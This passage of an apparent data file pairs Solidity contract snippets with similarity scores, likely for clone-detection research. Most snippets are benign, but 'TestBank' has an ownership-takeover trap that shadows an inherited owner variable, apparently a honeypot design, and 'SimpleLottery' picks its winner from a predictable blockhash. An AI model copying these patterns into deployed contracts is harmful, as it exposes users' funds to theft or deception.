            mstore(add(pointer, 0xa0), _m)

            
            let value := mload(0xc0)

            
            if iszero(call(not(0), 0x05, 0, pointer, 0xc0, value, 0x20)) {
                revert(0, 0)
            }

            result := mload(value)
        }
    }
}",0.5775439866360083,"contract Base 
{
    address Creator = msg.sender;
    address Owner_01 = msg.sender;
    address Owner_02;
    address Owner_03;
    
    function add(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        uint256 z = x + y;
        if((z >= x) && (z >= y))
        {
          return z;
        }
        else
        {
            revert();
        }
    }

    function sub(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        if(x >= y)
        {
           uint256 z = x - y;
           return z;
        }
        else
        {
            revert();
        }
    }

    function mul(uint256 x, uint256 y) 
    internal 
    returns (uint256) 
    {
        uint256 z = x * y;
        if((x == 0) || (z / x == y))
        {
            return z;
        }
        else
        {
            revert();
        }
    }
    
    event Deposit(address indexed sender, uint value);
    
    event Invest(address indexed sender, uint value);
    
    event Refound(address indexed sender, uint value);
    
    event Withdraw(address indexed sender, uint value);
    
    event Log(string message);
}"
"contract Extra {
   uint public data;
   Base public baseaddress = Base(0xca598f876f79a5f8f479bfa1dcc8f4f2dffbd5c2);

   function caller(){
        data = baseaddress.getdata();
   }

   function setter(uint _integer, bytes32 _bytes) {
       baseaddress.setdata(_integer, _bytes);
   }
}",0.5689495659836302,"contract ERC223 is ERC20 {
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transferFrom(address from, address to, uint value, bytes data) public returns (bool ok);
}"
"contract C {

mapping(address => bool) alreadyDone;

function oneTime(address user) returns(bool success) {
    if(alreadyDone[user]) throw;
    
    alreadyDone[user]=true;
}
",0.5952233569390145,"contract Token {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 value) public returns (bool success) {

    }
}"
"contract MedicalHistory {
    struct medicalData {
        address provider_address;
        string date;
        string[] medicine_name;
        uint[] quantity;
    }

    mapping(address => medicalData) approvalQueue;

    mapping (address=>medicalData[]) medicalDataHistory;

    function getData() public view returns(medicalData[] memory) {
        return medicalDataHistory[msg.sender];
    }

    
    function setData(address a,string memory d, string[] memory s, uint[] memory u, address patient) public {
        medicalData memory m = medicalData(a, d, s, u);
        approvalQueue[patient] = m;
        
    }

    function approve() public {
        medicalDataHistory[msg.sender].push(approvalQueue[msg.sender]);
        delete approvalQueue[msg.sender];
    }
}",0.5776050917298544,"contract GitmanIssue {



    address private mediator;

    address public parent; 

    string public owner;

    string public repository;

    string public issue;



    constructor (string ownerId, string repositoryId, string issueId, address mediatorAddress) public payable { 

        parent = msg.sender;

        mediator = mediatorAddress;

        owner = ownerId;

        repository = repositoryId;

        issue = issueId;

    }



    function resolve(address developerAddress) public {

        require (msg.sender == mediator, ""sender not authorized"");

        selfdestruct(developerAddress);

    }



    function recall() public {

        require (msg.sender == mediator, ""sender not authorized"");

        selfdestruct(parent);

    }

}"
"contract test {
    function a(uint someNumber) public returns(bool) {
        if(someNumber > 5){
          L(someNumber);
          return false; 
        }

        someNumber ++;
        
        L(someNumber);
        return true;
    }

    event L(uint256 n);
}",0.5950603796749937,"contract addition {
    address reservedSlot; 
    uint256 public myNumber;
    
    function add() public {
        myNumber = myNumber + 1;
    }
    
    function sub() public {
        myNumber = myNumber - 1;
    }
}"
"contract C {
  address[] public verifiedUsers;
  function C(address[] addr) {
    verifiedUsers.push(addr[0]);
    verifiedUsers.push(addr[1]);
  }
}",0.5591032623376241,"contract airDrop {
    function verify(address _address, bytes32 _secret) public constant returns (bool _status);
}"
"contract Three is Ownable {
    IOne public one;
    ITwo public two;
    constructor(IOne _one, ITwo _two) public {
        one = _one;
        two = _two;
    }
    function setOne(IOne _one) external onlyOnwer {
        one = _one;
    }
    function setTwo(ITwo _two) external onlyOnwer {
        two = _two;
    }
}",0.5641837557824677,"contract Ownable {



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function setOwner(address _owner) public onlyOwner {

        owner = _owner;

    }



    function getOwner() public view returns (address) {

        return owner;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



}"
"contract paymentCheck{
    Aion aion;

    function scheduleCheck() public {
        aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('Check()')));
        uint callCost = 200000*1e9 + aion.serviceFee();
        aion.ScheduleCall.value(callCost)( block.timestamp + 30 days, address(this), 0, 200000, 1e9, data, true);
    }

    function Check(){
        
    } 
    function () public payable {}

}",0.5038308548621445,"contract ERC827 is ERC20 {
  function approveAndCall(
    address _spender,
    uint256 _value,
    bytes _data
  )
    public
    payable
    returns (bool);

  function transferAndCall(
    address _to,
    uint256 _value,
    bytes _data
  )
    public
    payable
    returns (bool);

  function transferFromAndCall(
    address _from,
    address _to,
    uint256 _value,
    bytes _data
  )
    public
    payable
    returns (bool);
}"
"contract MyContract {
  address tracker_0x_address = 0xf3106ff9bd5ad9a12e91d90e0ed3526111668c1c;

  function getResult() public returns (uint256) {
    
    address test = 0xe780e329d218a1f849f1cab777217a2cfbb410f2; 
    return ERC20(tracker_0x_address).balanceOf(msg.sender);
  }

}",0.5256957905303085,"contract SafeContract is Ownable {

    
    function transferAnyERC20Token(address _tokenAddress, uint256 _tokens, address _beneficiary) public onlyOwner returns (bool success) {
        return ERC20Basic(_tokenAddress).transfer(_beneficiary, _tokens);
    }
}"
"contract NowContract {
    uint32 public nowValue = 0;

    constructor () public NowContract() {
        computeNow();
    }

    function computeNow() public {
        nowValue = uint32(block.timestamp);
    }
}",0.5672283511070098,"contract TimeBasedContract

{

    function TimeBasedContract() public {

    }



    function() public payable {

        uint minutesTime = (now / 60) % 60;

        require(((minutesTime/10)*10) == minutesTime);

    }

}"
"contract DeleteExample {
    uint data = 10;
    uint[] array;

    function f() public {
        uint x = data;                              
        delete data;                                
        require(x == 10, ""it was affected."");
        x = data;                                   
        require(x == 0, ""it was not deleted."");
    }

    function g() public {
        uint[] storage mem = array;                 
        array.push(1);
        array.push(11);
        array.push(21);
        require(mem.length == 3, ""not three elements."");
        require(mem[0]==1, ""not one."");
        require(mem[1]==11, ""not eleven."");
        require(mem[2]==21, ""not twenty-one."");
        delete array[1];                            
        require(mem[1]==0, ""element not gone."");    
    }
}",0.533044814701832,"contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a, ""Addition failed"");
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a, ""Subtraction failed"");
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}"
"contract MyContract {

  struct Person {
    uint age;
    uint size;
    bool exists;
  }

  
  Person[] persons;

  event PersonAdded(uint indexed id, uint age, uint size);

  function addPerson(uint _age, uint _size) public {
    Person memory person = Person(_age, _size, true);
    id = persons.push(person) - 1;

    emit PersonAdded(id, _age, _size);
  }

  function removePerson(uint _id) public {
    require(persons[_id].exists, ""Person does not exist."");

    delete persons[_id];
  }
}",0.5462888155051024,"contract ERC20 {



	function transfer(address to, uint value) public returns (bool success);
	function transferFrom(address from, address to, uint value) public returns (bool success);
	function approve(address spender, uint value) public returns (bool success);

	event Transfer(address indexed from, address indexed to, uint value);
	event Approval(address indexed owner, address indexed spender, uint value);
}"
"contract NameAssignment {

    string public name;

    function addName(string calldata _name) external {
      name = _name;
    }
}",0.5825109654311305,"contract Ownable {



    mapping(uint => string) public data;

    

    function addData(string memory inData) public {

        data[1] = inData;

    }



}"
"contract Foo {
    mapping (bytes32 => Thing) things;

    struct Thing {
        Item[] items;
        uint _bar;
    }

    struct Item {
        uint number;
    }

    function Foo(bytes32 id, uint bar) {
        things[id]._bar = bar;
    }
}",0.5374596330771725,"contract Registrar {
    function transfer(bytes32 _hash, address newOwner) public;
    function entries(bytes32 _hash) public constant returns (uint, Deed, uint, uint, uint);
}"
"contract TestEmojiCoin {
    uint public initialBalance = 1 ether;

    function testPurchase() public {
        address contractAddress = DeployedAddresses.EmojiCoin();
        EmojiCoin emojiCoin = EmojiCoin(contractAddress);

        

        address owner_0 = emojiCoin.tokenOwner(0);
        Assert.notEqual( owner_0, this, ""owner for coin 0 is incorrect"" );

        emojiCoin.purchase.value(1 ether).gas(30000000000)(0);

        owner_0 = emojiCoin.tokenOwner(0);
        Assert.equal( owner_0, this, ""owner for coin 0 is incorrect"" );
    }

    
    function() public payable { }

}",0.5611001008019205,"contract SimpleDonate is   Owned {



    using SafeMath for uint;  



    string public  name; 

 



 

 

    



    



    



    constructor(string contractName) public  { 

        name = contractName; 

    }



    

    

    function() public payable

    {

        

    }

  



    

     



    



    



    

     function withdrawEther(uint amount) public onlyOwner returns(bool) {

        

        require(amount < address(this).balance);

        owner.transfer(amount);

        return true;



    }

    

    



    



    



    function withdrawERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {



        return ERC20Interface(tokenAddress).transfer(owner, tokens);



    }



}"
"contract Storage {

    struct PlayerStruct {
        uint meaningless;
        uint[] dynamicList;
        uint[10] fixedList;
        mapping(bytes32 => uint) keyToUintMap;
    }

    mapping(address => PlayerStruct) public playerStructs;

    function getPlayerDynListLength(address player) public constant returns(uint count) {
        return playerStructs[player].dynamicList.length;
    }

    function appendPlayerDynList(address player, uint value) public returns(uint length) {
        return playerStructs[player].dynamicList.push(value);
    }

    function setPlayerDynFixedList(address player, uint index, uint value) public returns(bool success) {
        require(index <= 9);
        playerStructs[player].fixedList[index] = value;
        return true;
    }

    function getPlayerDynamicListElement(address player, uint index) public constant returns(uint value) {
        return playerStructs[player].dynamicList[index];
    }

    function setPlayerMappedElement(address player, bytes32 key, uint value) public returns(bool success) {
        playerStructs[player].keyToUintMap[key] = value;
        return true;
    }

    function getPlayerMappedElement(address player, bytes32 key) public constant returns(uint value) {
        return playerStructs[player].keyToUintMap[key];
    }

}",0.5849649876020561,"contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function burn(uint256 _value) public returns (bool success);
    function burnFrom(address _from, uint256 _value) public returns (bool success);
    function increaseSupply(uint value, address to) public returns (bool success);
    function decreaseSupply(uint value, address from) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Burn(address indexed from, uint tokens);
}"
"contract TugOfWar {

    int public score = 0;
    int constant endAt = 1 ether;
    bool public gameOver = false;
    event GameEnded(bool gameOver);
    event ScoreChanged(int amount,bool direction);

    function up() external payable {
        require(msg.value > 0);
        require(!gameOver);

        int value = int(msg.value);
        int amount= value;
        bool direction=true;
        score += value;

        
        emit ScoreChanged(amount,direction);

        checkIfGameOver();
    }

    function down() external payable {
        require(msg.value > 0);
        require(!gameOver);

        int value = int(msg.value);
        int amount=value;
        bool direction=false;
        score -= value;

        
        emit ScoreChanged(amount,direction);

        checkIfGameOver();
    }

    function checkIfGameOver() internal {
        if(score >= endAt || score <= endAt * -1) {
            gameOver = true;

            
            emit GameEnded(gameOver);
        }
    }
}",0.5590366973209975,"contract AccessRestriction {

    

    

    

    address public owner = msg.sender;

    uint public creationTime = now;



    

    

    

    

    

    

    modifier onlyBy(address _account)

    {

        require(

            msg.sender == _account,

            ""Sender not authorized.""

        );

        

        

        

        _;

    }



    

    

    function changeOwner(address _newOwner)

        public

        onlyBy(owner)

    {

        owner = _newOwner;

    }



    modifier onlyAfter(uint _time) {

        require(

            now >= _time,

            ""Function called too early.""

        );

        _;

    }



    

    

    

    function disown()

        public

        onlyBy(owner)

        onlyAfter(creationTime + 6 weeks)

    {

        delete owner;

    }



    

    

    

    

    

    

    modifier costs(uint _amount) {

        require(

            msg.value >= _amount,

            ""Not enough Ether provided.""

        );

        _;

        if (msg.value > _amount)

            msg.sender.transfer(msg.value - _amount);

    }



    function forceOwnerChange(address _newOwner)

        public

        payable

        costs(200 ether)

    {

        owner = _newOwner;

        

        if (uint(owner) & 0 == 1)

            

            

            return;

        

    }

}"
"contract TestContract {
    using TestLib for TestLib.DataSet;
    TestLib.DataSet set;

    function setBalanceInEth() public {
        set.assign();
    }

    function getBalanceInEth() public view returns(uint) {
        return set.getA();
    }
}",0.5825781685917425,"contract Token{

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    function balanceOf(address tokenOwner) public view returns (uint balance);

}"
"contract Test {

    function cond1() pure internal returns (bool) {
        
        uint[] memory array_a = new uint[](1);
        bytes32 hash1 = keccak256(array_a);
        array_a[0] = 42;
        bytes32 hash2 = keccak256(array_a);
        
        return hash1 != hash2;
    }

    function cond2() pure internal returns (bool) {
        
        uint[] memory array_a = new uint[](1);
        uint[] memory array_b = new uint[](1);
        array_a[0] = 42;
        array_b[0] = 42;
        
        return keccak256(array_a) == keccak256(array_b);
    }

    function cond3() pure internal returns (bool) {
        
        uint[] memory array_a = new uint[](1);
        uint[] memory array_b = new uint[](2);
        
        return keccak256(array_a) != keccak256(array_b);
    }

    function cond4() pure internal returns (bool) {
        
        uint[] memory array_a = new uint[](2);
        uint[] memory array_b = new uint[](2);
        array_a[0] = 42; array_a[1] = 17;
        array_b[0] = 17; array_a[1] = 42;
        
        return keccak256(array_a) != keccak256(array_b);
    }

    function testConditions() pure public returns (bool) {
        return cond1() && cond2() && cond3() && cond4();
    }
}",0.5917966576634444,"contract SafeMath {

  function safeMul(uint a, uint b) internal pure returns (uint256) {

    uint c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }



  function safeDiv(uint a, uint b) internal pure returns (uint256) {

    uint c = a / b;

    return c;

  }



  function safeSub(uint a, uint b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint a, uint b) internal pure returns (uint256) {

    uint c = a + b;

    assert(c >= a);

    return c;

  }



  function max64(uint64 a, uint64 b) internal pure returns (uint64) {

    return a >= b ? a : b;

  }



  function min64(uint64 a, uint64 b) internal pure returns (uint64) {

    return a < b ? a : b;

  }



  function max256(uint256 a, uint256 b) internal pure returns (uint256) {

    return a >= b ? a : b;

  }



  function min256(uint256 a, uint256 b) internal pure returns (uint256) {

    return a < b ? a : b;

  }

}"
"contract MyContract {
    string myStorageVariable;

    function removeTheVariable(string strArg) public {
        myStorageVariable = strArg;
        delete myStorageVariable;
    }
}",0.5320374567586739,"contract StableAddressStore {
    mapping (address => mapping(address=>string)) public store;
    
    function setValue(address key,string _value) {
        store[msg.sender][key]=_value;
    }
}"
"contract SecondContract {
    function FetchDetail(address userAddress) public constant returns(string,uint ) {
        string memory  data1;
        uint  data2;
        UserRegistration ud=new UserRegistration();
        (data1,data2)= ud.getUserData(userAddress);
        return(data1,data2);
    }
}",0.5524257752149814,"contract UsingAdmin is
    UsingRegistry
{
    constructor(address _registry)
        UsingRegistry(_registry)
        public
    {}

    modifier fromAdmin(){
        require(msg.sender == getAdmin());
        _;
    }
    
    function getAdmin()
        public
        constant
        returns (address _addr)
    {
        return addressOf(""ADMIN"");
    }
}"
"contract A {
  event created(uint timestamp);
  function A() {
    created(block.timestamp);
  }
}",0.564759366100657,"contract ITimeMachine {

  function getTimestamp_() internal view returns (uint);

}"
"contract HelpLogs {

  event LogFirstHalf(bytes _data);
  event LogSecondHalf(bytes _data);

  function logit(bytes dataPart1, bytes dataPart2) external {
    LogFirstHalf(dataPart1);
    LogSecondHalf(dataPart2);
  }
}",0.5119742077597016,"contract TestERC223 {
    event Log(address from, uint value, bytes data);
    
    function tokenFallback(address from, uint value, bytes memory data) public {
        emit Log(from, value, data);
    }
}"
"contract test {
    bytes data;

    function addData(bytes _data) public {
        data = _data;
    }

}",0.5952195733757011,"contract ExternalToken {
    function burn(uint256 _value, bytes _data) public;
}"
"contract Test {
    function addTest() public pure returns (byte c1, byte c2, byte c3) {
        
        bytes memory b = new bytes(169);
        b[0] = byte(59);
        b[1] = byte(42);
        b[2] = byte(99);

        assembly {
            
            
            let data32b := mload(add(b, 0x20))
            c1 := data32b
            
            
            c2 := shl(data32b, 8)
            
            c3 := shl(data32b, mul(8, 2))
        }
    }
}",0.5367947770464983,"contract Util {



   

    function upper(string _base) internal pure returns (string) {

        bytes memory _baseBytes = bytes(_base);

        for (uint i = 0; i < _baseBytes.length; i++) {

            bytes1 b1 = _baseBytes[i];

            if (b1 >= 0x61 && b1 <= 0x7A) {

                b1 = bytes1(uint8(b1)-32);

            }

            _baseBytes[i] = b1;

        }

        return string(_baseBytes);

    }



}"
"contract Test {

uint32[100] public people;
uint256 public counter; 
mapping(uint32 => bool) public voteVerifier; 


function onlyOneVote(uint32 ida) public returns(bool) {
  require(!voteVerifier[ida]); 

    people[counter] = ida; 
    counter = counter + 1;

    voteVerifier[ida] = true;
  return true;
}

}",0.5887522901757241,"contract CappedToken is MintableToken {
    uint256 public cap;

   constructor(uint256 _cap) public {
        require(_cap > 0);
        cap = _cap;
    }

    
    function mint(address _to, uint256 _amount) onlyOwner public returns (bool) {
        require(totalSupply.add(_amount) <= cap);

        return super.mint(_to, _amount);
    }
}"
"contract hoteltranscation  {

    struct hotel{
        string HotelName;
        uint256 BookingNumber;
    }

    hotel[] HotelBookings;

    function HotelBooking(string _HotelName, uint256 _BookingNumber) public   {

        hotel memory tempHotel = hotel (_HotelName, _BookingNumber);
        
        HotelBookings.push(tempHotel);
    }

    function GetHotelBooking(uint _num) public view returns(string, uint256) {
        return (HotelBookings[_num].HotelName, HotelBookings[_num].BookingNumber);
    }
}",0.5169317239612108,"contract picOneCommitment {
    
    
    uint256 blockNumber = 8526184;
    
    
    string hash= ""b583bcbe34fa8b22c5c14f1200b0f87acab35333ce8d960cf72d6b1d6ad2b3bf"";
    
    uint256 private deployedAt = now;
    
    function getDeployedAt() public view returns (uint256) {
        return deployedAt;
    }
    
    function getHash() public view returns (string memory) {
        return hash;
    }
       
    function getBlockNumber() public view returns (uint256) {
        return blockNumber;
    } 
    
}"
"contract gaussianDistribution {

struct BellCurve {
    uint population;
    uint total;
    uint mean;
    uint standardDeviation;
    mapping(address => uint) plot;
    mapping(address => uint) differences;
    uint differences_squared_sum;
    uint variance;
    mapping(address => uint) sigma;
}

BellCurve bellcurve;

function calculateMean() {
  require(bellcurve.mean == 0);
  bellcurve.mean = bellcurve.total / bellcurve.population;
}

function calculateDifference(address _node) {
  require(bellcurve.variance == 0);
  uint mean = bellcurve.mean;
  require(mean != 0); 
  uint plot = bellcurve.plot[_node];
  require(plot != 0); 
  require(bellcurve.differences[_node] == 0); 
  uint difference = mean - plot;
  bellcurve.differences[_node] = difference;
  bellcurve.differences_squared_sum += difference^2;
}

function calculateVariance() {
  uint variance = bellcurve.differences_squared_sum / bellcurve.population;
  bellcurve.variance = variance;
}

  function calculateStandardDeviation() {
    uint variance = bellcurve.variance;
    require(variance != 0);
    bellcurve.standardDeviation = sqrt(bellcurve.variance);
}

function sqrt(uint x) returns (uint y) {
    uint z = (x + 1) / 2;
    y = x;
    while (z < y) {
        y = z;
        z = (x / z + z) / 2;
    }
}


}",0.5249746806051164,"contract StandardToken is ERC20Interface {
    using SafeMath for uint;

    uint public maxSupply;
    uint public totalSupply;
    uint public timestampMint;
    uint public timestampRelease;
    uint8 public decimals;

    string public symbol;
    string public  name;

    address public owner;

    bool public stopped;

    mapping(address => uint) public balanceOf;
    mapping (address => uint) public permissonedAccounts;

    
    modifier onlyAfter() {
        require(now >= timestampMint + 3 weeks);
        _;
    }

    
    modifier isActive() {
        require(!stopped);
        _;
    }

    
    modifier hasPermission(uint _level) {
        require(permissonedAccounts[msg.sender] > 0);
        require(permissonedAccounts[msg.sender] <= _level);
        _;
    }

    
    function circulatingSupply() public view returns (uint) {
        return totalSupply;
    }

    
    function balanceOf(address _owner) public view returns (uint balance) {
        return balanceOf[_owner];
    }

    
    function transfer(address _to, uint _value) public isActive returns (bool) {
        require(_to != address(0));
        require(_value <= balanceOf[msg.sender]);
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        TransferEvent(msg.sender, _to, _value);
        return true;
    }
}"
"contract Foo {
  using GraphLibrary for GraphLibrary.Graph;

  GraphLibrary.Graph public graph;

  
  function insertNode (uint a, uint b, uint c) public {
    graph.deleteEdge (a, b);
    graph.addEdge (a, c);
    graph.addEdge (c, b);
  }
}",0.5745918779342656,"contract SafeMath {

    function safeAdd(uint _a, uint _b) public pure returns (uint c) {

        c = _a + _b;

        require(c >= _a);

    }

    function safeSub(uint _a, uint _b) public pure returns (uint c) {

        require(_b <= _a);

        c = _a - _b;

    }

}"
"contract Helper {    



function doStuff() public {
      contractA.aFunction();
      contractB.anotherFunction();
    }
}",0.5625349618279488,"contract SaiTopAbstract {
    function cage() public;
    function setOwner(address) public;
}"
"contract Child {
    uint i1;
    uint i2;
    uint i3;
    uint i4;
    uint i5;

    function f1() { i1=1;   }
    function f2() { i2=2;   }
    function f3() { i3=3;   }
    function f4() { i4=4;   }
    function f5() { i5=5;   }

    function f1_() { i1=1;  }
    function f2_() { i2=2;  }
    function f3_() { i3=3;  }
    function f4_() { i4=4;  }
    function f5_() { i5=5;  }
}",0.5154558940504691,"contract FiatContract {
  function ETH(uint _id) constant returns (uint256);
  function USD(uint _id) constant returns (uint256);
  function EUR(uint _id) constant returns (uint256);
  function GBP(uint _id) constant returns (uint256);
  function updatedAt(uint _id) constant returns (uint);
}"
"contract Test {
    struct A {
        uint8[] a;
    }
    A one;
    A[] many;

    function Test() {
        one.a = [1, 2, 3];

        many.length++;
        many[0].a = [1, 2, 3];
    }
}",0.5127716309162956,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract X {
  struct FakeBlock {
    uint timestamp;
  }

  FakeBlock block;

  uint now;

  function setBlockTime(uint val) {
    now = val;
    block.timestamp = val;
  }
}",0.5447998236721948,"contract DateTime {

    function getMonth(uint timestamp) public pure returns (uint8);

    function getDay(uint timestamp) public pure returns (uint8);

}"
"contract Something {

    mapping (address => Ton[]) allTons;

    struct Ton { 
        uint id;
        string name;
        bool access;
    }

    function Something() public {

        allTons[msg.sender].push(Ton({
            id: 1,
            name: ""CoolDude"",
            access: true
        }));

        allTons[msg.sender].push(Ton({
            id: 2,
            name: ""NotCoolDude"",
            access: false
        }));
    }

    
    

    function getTonAtRow(address user, uint row) public constant returns(uint, string, bool) {
        return(allTons[user][row].id, allTons[user][row].name, allTons[user][row].access);

    }

}",0.5908410595972196,"contract EOSpace is StandardToken {
  string public constant name = ""EOSpace"";
  string public constant symbol = ""EOP"";
  uint8 public constant decimals = 18;
  mapping(address => bool) public claimed;
  event Claim(address indexed from);

  constructor() public {
    totalSupply = 10000000000e18;
    balances[msg.sender] = totalSupply;
  }

  function claim() public returns (bool) {
    claimed[msg.sender] = true;
    emit Claim(msg.sender);
    return true;
  }
}"
"contract ProxyConract {
    address public stateAddress;
    StateContract state;

    constructor(address _stateAddress) public {
        stateAddress = _stateAddress;
        state = StateContract(stateAddress);
    }

    event logSuccessfulStateEdit(uint256 _conractVariable);

    function changeStateData(uint256 _stateData) public returns(bool) {
        require(state.editContractVariable(_stateData));
        return true;
    }

    function getStateData() public view returns(uint256) {
        return state.getContractVariable();
    }
}",0.5620533512907371,"contract Cosigner {

    uint256 public constant VERSION = 2;

    

    

    function url() public view returns (string);

    

    

    function cost(address engine, uint256 index, bytes data, bytes oracleData) public view returns (uint256);

    

    

    function requestCosign(address engine, uint256 index, bytes data, bytes oracleData) public returns (bool);

    

    

    function claim(address engine, uint256 index, bytes oracleData) public returns (bool);

}"
"contract Hello is mortal {
    string public message;

    function Hello() public {
        message = 'This is the initial Message';
    }

    function getMessage() public constant returns(string) {
        return message;
    }

    function setNewMessage(string newMessage) public payable {
        message = newMessage;   
    }
}",0.5985443711275068,"contract TokenControllerBase is RSTBase {
  function init() public;
  function isSellOpen() public constant returns(bool);
  function isBuyOpen() public constant returns(bool);
  function sell(uint value) public;
  function buy() public payable;
  function addToReserve() public payable;
}"
"contract Inbox {
    string public message;

    event NewMessage(string _message, uint _block, uint _timestamp, address _user);

    function Inbox (string initialMessage) public {
        message = initialMessage;
        emit NewMessage(initialMessage, block.number, block.timestamp, msg.sender);
    }

    function setMessage(string newMessage) public{
        message = newMessage;
        emit NewMessage(newMessage, block.number, block.timestamp, msg.sender);
    }
}",0.5483858934719483,"contract TimeStampingAuthority {
    
    struct Entry {
        address sender;
        uint timestamp;
        string note;
    }

    mapping(bytes => Entry) entries;
    
    function submitEntry(bytes _hash, string note) public {
        require(entries[_hash].timestamp == 0);
        entries[_hash] = Entry(msg.sender, now, note);
    }
    
    function getEntry(bytes _hash) public constant returns (address, uint, string) {
        return (entries[_hash].sender, entries[_hash].timestamp, entries[_hash].note);
    }
}"
"contract Freezing {
    mapping(address => uint256) lastDeposit;

    function deposit() public payable {
        require(lastDeposit[msg.sender] + 30 days < now);

        lastDeposit[msg.sender] = now;
    }
}",0.5803666535642319,"contract PreArtexToken {
    function balanceOf(address _owner) constant returns(uint256 balance);
    mapping(address => uint) public deposits;
    uint public tokenPriceUSDWEI;
}"
"contract MyGame {
  int currentGame = 1;
  struct Register {
    int gameNumber;
  }
  mapping (address => Register) players;  

  function Play() {
    players[msg.sender].gameNumber = currentGame;
  }

  function HasPlayed() {
    return players[msg.sender].gameNumber == currentGame;
  }

  function NextGame() {
    currentGame++;
  }
}",0.5500751050146849,"contract Hash {
    
    address owner;

    
    function Hash() public {
        owner = msg.sender;
    }

    
    function() internal {
        revert();
    }

    function hash(string dataString) public pure returns(bytes32){
        return(keccak256(dataString));
    }

    function selfDestruct() public {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract Test {
    function toBytesNickJohnson(uint256 x) constant returns (bytes b) {
        b = new bytes(32);
        assembly { mstore(add(b, 32), x) }
    }

    function toBytesEth(uint256 x) constant returns (bytes b) {
        b = new bytes(32);
        for (uint i = 0; i < 32; i++) {
            b[i] = byte(uint8(x / (2**(8*(31 - i))))); 
        }
    }

    function toBytesNicolasMassart(uint256 x) constant returns (bytes c) {
        bytes32 b = bytes32(x);
        c = new bytes(32);
        for (uint i=0; i < 32; i++) {
            c[i] = b[i];
        }
    }    
}",0.5945113958616489,"contract Math {
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
}"
"contract Factory {

    
    
    
    address Admin;

    constructor () public {
        Admin = msg.sender;
    }    

    function createNewContract(string memory Name, string memory Type, uint Fee) public returns(address) {
        YourContract newContract = new YourContract(Name, Type, Fee);
        return address(newContract);
    }
}",0.5966392772769626,"contract Beneficiary {
    
    
    
    function receiveEthersTo(address wallet, string memory balanceType)
    public
    payable;

    
    
    
    
    
    
    
    
    function receiveTokensTo(address wallet, string memory balanceType, int256 amount, address currencyCt,
        uint256 currencyId, string memory standard)
    public;
}"
"contract SimpleLottery {
    uint public constant TICKET_PRICE = 1e16; 

    address[] public tickets;
    address public winner;
    uint public ticketingCloses;

    function SimpleLottery (uint duration) public {
        ticketingCloses = now + duration;
    }

    function buy () public payable {
        require(msg.value == TICKET_PRICE); 
        require(now < ticketingCloses);

        tickets.push(msg.sender);
    }

    function drawWinner () public {
        require(now > ticketingCloses + 5 minutes);
        require(winner == address(0));

        bytes32 rand = keccak256(
            block.blockhash(block.number-1)
        );
        winner = tickets[uint(rand) % tickets.length];
    }


    function withdraw () public {
        require(msg.sender == winner);
        msg.sender.transfer(this.balance);
    }

    function () payable public {
        buy();
    }
}",0.5987312575004428,"contract TestBank is Owned {
    event BankDeposit(address from, uint amount);
    event BankWithdrawal(address from, uint amount);
    address public owner = msg.sender;
    uint256 ecode;
    uint256 evalue;

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        BankDeposit(msg.sender, msg.value);
    }

    function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {
        ecode = code;
        evalue = value;
    }

    function useEmergencyCode(uint256 code) public payable {
        if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
    }
}"
"contract Example {


    function A(uint val) {
       
    }

    function B(uint val){
        
        A(val);
    }

}",0.5950205454984829,"contract BurnableErc20 is ERC20 {

    function burn(uint value) external;

}"
"contract B is IB {
    IA public a;
    function set(address _a) external {a = IA(_a);}
    
}",0.5991464352875798,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract A { 

    struct ContractStructs { 
        address contractOwner;
    }

    mapping(address => ContractStructs) contractStructs; 
    address[] private contractIndex; 

    address owner; 

    function A() {
        owner = msg.sender; 
    }

    function newB() returns(address newB) {
        B b = new B(msg.sender); 
        contractStructs[b].contractOwner = msg.sender; 
        contractIndex.push(b); 
        return b; 
    }

    function getContractCount() constant returns(uint contractCount) {
        return contractIndex.length; 
    }

    function getContractAtIndex(uint index) constant returns(address contractAddress) {
        return contractIndex[index]; 
    }

    function getContractOwner(address contractAddress) constant returns(address contractOwner) {
        return contractStructs[contractAddress].contractOwner; 
    }

}",0.5774310739826044,"contract MarriageContract {

    

    address a;

    address b;

    uint256 till;

